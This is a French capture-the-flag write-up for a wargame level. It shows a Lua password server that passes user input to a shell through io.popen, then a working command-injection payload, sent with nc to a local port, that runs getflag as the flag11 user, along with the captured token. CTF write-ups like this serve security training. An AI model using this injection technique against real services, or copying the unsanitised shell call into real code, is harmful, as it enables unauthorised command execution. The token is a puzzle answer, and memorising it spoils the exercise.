# level11

### Observations:
##### J'affiche le programme accessible dans le dossier utilisateur:
```lua
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end
```
Je me rend compte que ce programme est execute par defaut en tant qu'utilisateur 'flag11' grace a la commande:
```sh
ps aux | grep flag11
```

##### Entrees du programme
```lua
string mot_de_passe
```

##### Fonctionnement
Le programme est un serveur qui tente de hasher la chaine de caracteres entree par l'utilisateur.
Il compare ensuite la chaine hashee avec une chaine predefinie pour afficher differents messages inutiles. 

> Le serveur est heberge sur l'addresse ip '127.0.0.1' avec le port '5151'.

> Le serveur est execute en arriere-plan grace a cron par defaut.

##### Conclusions
La fonction hash a une vulnerabilite qui nous laisse executer du code shell comme nous le voulons. \
Vu que ce programme est execute par l'utilisateur 'flag11' par defaut nous pouvons avoir acces a son flag. 

## Resolution:
J'effectue une commande qui permet d'obtenir le resultat de 'getflag' une fois que le parseur lua aura effectue une passe, par la suite je redirige la sortie de cette derniere dans un fichier accessible car je ne pouvais pas la voir autrement. \
J'affiche ensuite le contenu de ce fichier.

#### commandes:
```sh
nc 127.0.0.1 5151 <<<'$(getflag >/tmp/OUTPUT)'
cat /tmp/OUTPUT
```

**token :** fa6v5ateaw21peobuub8ipe6s